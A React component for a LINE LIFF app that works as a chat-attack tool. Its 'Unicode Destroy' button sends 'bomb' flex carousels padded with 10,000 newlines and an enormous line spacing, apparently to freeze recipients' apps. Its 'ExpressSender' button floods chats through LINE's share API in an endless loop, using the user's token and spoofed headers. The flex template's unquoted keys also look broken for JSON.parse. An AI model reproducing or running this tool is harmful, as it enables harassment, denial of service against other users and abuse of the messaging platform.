import React, { useState } from "react";

export default function Send(props) {
    let liff = props.liff;

    let [data, setData] = useState({
        expressText: ""
    });

    function sendFlexUnicode() {
        console.log("atk!")

        let unicode = `\n`.repeat(10000);

        let flex_obj = `{
            type: "flex",
            altText: "@bomb",
            contents: {
              type: "carousel",
              contents: [
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "horizontal",
                    contents: [
                      {
                        type: "text",
                        text: "bomb!",
                        wrap: true,
                        size: "2xl",
                        weight: "bold",
                        color: "#000000",
                        lineSpacing: "1145141919px",
                      },
                    ],
                  },
                },
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "horizontal",
                    contents: [
                      {
                        type: "text",
                        text: "bomb!",
                        wrap: true,
                        size: "2xl",
                        weight: "bold",
                        color: "#000000",
                        lineSpacing: "1145141919px",
                      },
                    ],
                  },
                },
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "horizontal",
                    contents: [
                      {
                        type: "text",
                        text: "bomb!",
                        wrap: true,
                        size: "2xl",
                        weight: "bold",
                        color: "#000000",
                        lineSpacing: "1145141919px",
                      },
                    ],
                  },
                },
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "horizontal",
                    contents: [
                      {
                        type: "text",
                        text: ${unicode},
                        wrap: true,
                        size: "2xl",
                        weight: "bold",
                        color: "#000000",
                        lineSpacing: "1145141919px",
                      },
                    ],
                  },
                },
              ],
            },
          }
        `;

        const auth = "Bearer " + liff.getAccessToken();
        const msg_obj = JSON.parse(flex_obj);

        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': auth,
            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
            'Referer': 'https://line-toolbox.f5.si/'
        };

        fetch('https://api.line.me/message/v3/share', {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                messages: [msg_obj, msg_obj, msg_obj, msg_obj, msg_obj]
            }),
            compressed: true
        })
    }

    // (c): amex/amex2189 無断使用禁止 発覚時 5000円徴収

    function expressSend() {
        const auth = "Bearer " + liff.getAccessToken();
        const msg_obj = {
            type: "text",
            text: data.expressText
        };

        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': auth,
            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
            'Referer': 'https://line-toolbox.f5.si/'
        };

        const numRequests = 5;

        const sendRequest = async () => {
            try {
                const promises = [];

                for (let i = 0; i < numRequests; i++) {
                    promises.push(
                        fetch('https://api.line.me/message/v3/share', {
                            method: 'POST',
                            headers: headers,
                            body: JSON.stringify({
                                messages: [msg_obj, msg_obj, msg_obj, msg_obj, msg_obj]
                            }),
                            compressed: true
                        })
                    );
                }

                Promise.all(promises);
                requestAnimationFrame(() => { sendRequest(); });
            } catch (error) {
                console.error('Error sending requests:', error);
            }
        };

        sendRequest();
    }



    return (
        <>
            <div>
                <t>Unicode Destroy α</t>
                <t class="desc">Unicodeが制限された今でも使える新型Unicodeです。</t>
                1個: <button onClick={() => { sendFlexUnicode() }}>Send</button> <br />
                <t>ExpressSender</t>
                <t class="desc">最高速度を出せます。1分 500+ メッセージ</t>
                <t>
                    <input
                        type="text"
                        value={data.expressText}
                        placeholder="message"
                        onChange={(e) => {
                            setData({ ...data, expressText: e.target.value });
                        }}
                    />
                </t>
                <t>
                    <button onClick={() => { expressSend(); }}>Send</button>
                </t>
            </div>
        </>
    );
}
